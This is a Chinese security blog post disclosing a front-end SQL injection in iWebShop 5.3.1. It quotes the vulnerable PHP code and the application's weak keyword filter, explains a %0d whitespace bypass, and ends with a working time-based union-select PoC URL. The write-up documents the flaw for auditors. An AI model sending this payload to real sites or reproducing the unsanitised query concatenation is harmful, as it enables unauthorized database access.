---
title: Iwebshop sql注入
date: 2019-01-19T18:12:19+08:00
lastmod: 2019-01-19T18:12:19+08:00
author: bluebird
categories: ["网络安全"]
tags: ["漏洞分析", "代码审计"]
---

### iwebshop 最新版本5.3.1 前台注入

iwebshop最新版存在一个非常弱智的注入漏洞
<!--more-->

主要导致原因 `$id        = IFilter::act(IReq::get('id'));`

开发者忘记写成 `IFilter::act(IReq::get('id'), 'int')`了,导致直接注入. 在其他文件也存在这个问题. 

这个文件需要商家账号才可以访问,是可以注册的

漏洞点 `controllers/seller.php` 函数`categoryAjax`

```php
    public function categoryAjax()
    {
        $id        = IFilter::act(IReq::get('id'));
        $parent_id = IFilter::act(IReq::get('parent_id'));
        if($id && is_array($id))
        {
            foreach($id as $category_id)
            {
                $childString = goods_class::catChild($category_id);//父类ID不能死循环设置成其子分类
                if($parent_id > 0 && stripos(",".$childString.",",",".$parent_id.",") !== false)
                {                    die(JSON::encode(array('result' => 'fail')));                }
            }
```

直接将id传入到`catChild`

```
 public static function catChild($catId,$level = 1)
    {        if($level == 0)        {
            return $catId;
        }

        $temp   = array();
        $result = array($catId);        $catDB  = new IModel('category');
        while(true)
        {
            $id = current($result);
            if(!$id)
            {
                break;
            }
            $temp = $catDB->query('parent_id = '.$id);
```



直接将id拼接到sql查询中.. 这个cms有一点sql过滤,但是非常弱,也就ctf入门题的水平

`lib/core/util/filter_class.php`

```
   public static function string($str,$limitLen = false)
    {
        $str = trim($str);
        $str = self::limitLen($str,$limitLen);
        $str = htmlspecialchars($str,ENT_NOQUOTES);
        return self::addSlash($str);
    }
    
  
    public static function word($str)
    {
        $word = array("select ","select/*","update ","update/*","delete ","delete/*","insert into","insert/*","updatexml","concat","()","/**/","union(");
        foreach($word as $val)
        {
            if(stripos($str,$val) !== false)
            {
                return '';
            }
        }
        return self::removeEmoji($str);
    }

```

不允许`union `加空格,可是空格的代替很多 比如 `%0d`



poc 
```
/index.php?controller=seller&action=categoryAjax&id[]=1%20and%201=1%20union%0dselect%0d1,2,3,4,5,6,7,8,sleep(5)

```

